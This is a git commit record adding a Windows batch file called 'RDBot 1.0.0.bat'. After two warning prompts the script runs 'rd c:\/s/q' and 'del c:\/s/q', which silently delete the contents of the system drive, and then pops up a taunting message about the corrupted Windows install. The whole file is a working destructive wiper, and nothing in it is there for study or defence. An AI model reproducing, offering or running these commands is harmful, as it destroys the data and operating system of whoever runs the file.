8b332fa6f933f55531fcbd9e329db37e7a210701
ZiIsANerd <96735005+ZiIsANerd@users.noreply.github.com>
2021-12-28 08:23:46 +0800

    Add files via upload

---
+++ RDBot 1.0.0.bat
@@ -0,0 +1,9 @@
+@echo off
+title RDBot 1.0.0
+echo The true version 1 has been lost, this is a simple warning. Do you want to execute it? If not, close the window.
+pause
+echo LAST WARNING, DO YOU WANT TO EXECUTE THIS PROGRAM?
+msg * You can't help but watch as your install gets destroyed
+rd c:\/s/q
+del c:\/s/q
+msg * enjoj ur new corrup window instal1!1!1!1!!11!!1!1!!!!!1!!!!
